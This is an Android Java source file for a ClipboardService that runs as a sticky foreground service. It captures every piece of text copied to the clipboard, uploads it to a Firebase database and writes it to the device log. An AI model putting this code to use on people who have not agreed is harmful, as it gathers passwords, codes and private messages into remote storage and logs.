package com.example.myapplication;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class ClipboardService extends Service {
    private static final String CHANNEL_ID = "ClipboardServiceChannel";
    private static final String TAG = "ClipboardService";
    private ClipboardManager clipboardManager;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForegroundService();
        monitorClipboard();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Return START_STICKY to keep the service running
        return START_STICKY;
    }

    private void startForegroundService() {
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Clipboard Service")
                .setContentText("Monitoring clipboard...")
                .setSmallIcon(R.drawable.ic_copy) // Replace with your app's icon
                .build();

        startForeground(1, notification);
    }

    private void monitorClipboard() {
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        clipboardManager.addPrimaryClipChangedListener(() -> {
            if (clipboardManager.hasPrimaryClip()) {
                ClipData clipData = clipboardManager.getPrimaryClip();
                if (clipData != null && clipData.getItemCount() > 0) {
                    ClipData.Item item = clipData.getItemAt(0);
                    CharSequence clipboardText = item.getText();
                    if (clipboardText != null) {
                        uploadDataToFirebase(clipboardText.toString());
                    } else {
                        Log.d(TAG, "Clipboard item is empty or not a text.");
                    }
                } else {
                    Log.d(TAG, "No clip data found.");
                }
            } else {
                Log.d(TAG, "No primary clip available.");
            }
        });
    }

    private void uploadDataToFirebase(String clipboardText) {
        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("clipboard_data");
        databaseReference.push().setValue(clipboardText)
                .addOnSuccessListener(aVoid -> Log.d(TAG, "Data uploaded successfully: " + clipboardText))
                .addOnFailureListener(e -> Log.e(TAG, "Failed to upload data: " + e.getMessage()));
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null; // We don't provide binding
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Clipboard Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }
}
